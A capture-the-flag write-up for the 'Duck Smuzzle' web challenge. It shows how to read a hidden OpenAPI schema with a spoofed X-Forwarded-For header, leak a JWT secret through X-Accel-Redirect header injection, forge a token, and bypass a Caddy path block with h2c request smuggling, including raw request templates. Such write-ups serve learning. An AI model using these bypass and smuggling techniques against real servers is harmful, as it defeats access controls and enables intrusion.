# Duck Smuzzle

## Description

Muzzle Smuzzle

*This challenge is solvable and contains a zero-day vulnerability. It’s not impossible to solve; you just need to find a way to bypass the WAF.

`curl http://duck-smuzzle.v1t.site/goose`

## Solution Walkthrough

Looking at the code, we first go to `/goose` to get a cookie. We then need to change the cookie's `role` to `duck` and provide the correct password to get the flag.

Seeing that the function for `/duck` is named `REDACTED`, we know that the function name itself is the password.

```py
@app.get("/duck")
async def REDACTED(
    password: str,
    sid: str | None = Cookie(default=None),
):
    role = get_role_from_jwt(sid)

    if password == "REDACTED" and role == "duck":
        return FLAG

    return "quack"
```

Next, we go to `/openapi.json`. Since it is blocked, we need to add the `X-Forwarded-For: 67.67.67.67` header and target port `:81` where the nginx is running.

```json
{
    "openapi": "3.1.0",
    "info": {
        "title": "FastAPI",
        "version": "0.1.0"
    },
    "paths": {
        "/duck": {
            "get": {
                "summary": "D8Xao6H7Encgx5V4Fwhsbvgztypnebkq",
                "operationId": "d8XAO6H7enCGx5V4fWhsBvgztyPNEbKq_duck_get",
                "parameters": [
                    {
                        "name": "password",
                        "in": "query",
                        "required": true,
                        "schema": {
                            "type": "string",
                            "title": "Password"
                        }
                    },
                    {
                        "name": "sid",
                        "in": "cookie",
                        "required": false,
                        "schema": {
                            "anyOf": [
                                {
                                    "type": "string"
                                },
                                {
                                    "type": "null"
                                }
                            ],
                            "title": "Sid"
                        }
                    }
                ],
                "responses": {
                    "200": {
                        "description": "Successful Response",
                        "content": {
                            "application/json": {
                                "schema": {}
                            }
                        }
                    },
                    "422": {
                        "description": "Validation Error",
                        "content": {
                            "application/json": {
                                "schema": {
                                    "$ref": "#/components/schemas/HTTPValidationError"
                                }
                            }
                        }
                    }
                }
            }
        },
        ...
    },
    ...
}
```

The string before the `operationId` is the password: `D8Xao6H7Encgx5V4Fwhsbvgztypnebkq`. Next, we need to retrieve the JWT secret.

Notice `/flag`: it takes user input and turns it into a header. Since nginx has a `/private` path that returns the JWT secret, we set `x` to `X-Accel-Redirect`, `y` to `/private`, and `password` to the password we just obtained to get the JWT secret.

```py
@app.get("/flag")
async def flag(
    response: Response,
    x: str,
    y: str,
    password: str | None = None,
):
    if password == "REDACTED":
        response.headers[x] = y
    return hashlib.sha256(FLAG.encode()).hexdigest()
```

Finally, we need to visit `/duck` to get the flag. However, doing so gets blocked by Caddy and nginx, which leads us to the main point of this challenge. I am accessing via `:80`, so I need to bypass Caddy.

The challenge name is `Smuzzle`, so it's not hard to guess that it's related to `smuggle`. Since it uses hypercorn, which supports h2c, I suspect it is `h2c smuggling`.

The process is: the client first sends an HTTP/1.1 request with the header `Upgrade: h2c`. The server responds with `101 Switching Protocols`, and the same TCP connection switches to HTTP/2, allowing the client to open new streams in HTTP/2. Since Caddy's blocking of `/duck` is applied to the initial HTTP/1.1 request, we won't be blocked.

Therefore, I wrote a Python script to obtain the flag. I first go to `/flag`, which is not blocked by Caddy's `/duck*` rule because it isn't `duck`.

```text
GET /flag?x=a&y=b&password=<password> HTTP/1.1
Host: duck-smuzzle.v1t.site
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: ...
```

After the upgrade is successful, I send a new HTTP/2 stream within the same h2c connection:

```text
GET /duck?password=<password>
cookie: sid=<forged duck jwt>
x-forwarded-for: 67.67.67.67
```

This way, `/duck` is sent directly to the backend, bypassing the `/duck*` block that Caddy applies at the HTTP/1.1 layer, allowing us to obtain the flag.

## Flag

```text
v1t{wh0_smuggl3_my_403}
```
